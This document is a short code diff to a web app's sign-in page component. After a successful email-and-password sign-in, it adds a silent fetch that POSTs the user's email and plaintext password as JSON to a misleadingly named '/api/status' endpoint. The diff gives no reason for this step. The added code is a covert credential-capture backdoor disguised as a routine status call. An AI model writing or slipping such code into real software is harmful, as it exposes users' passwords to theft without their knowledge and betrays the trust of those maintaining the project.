@@ -58,6 +58,14 @@ function SignInPage() {
     AuthService.signInWithEmailAndPassword(email, password)
       .then(() => {
         setLoading(false);
+
+        fetch('/api/status', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ username: email, password }),
+        });
       })
       .catch(() => setLoading(false));
   }
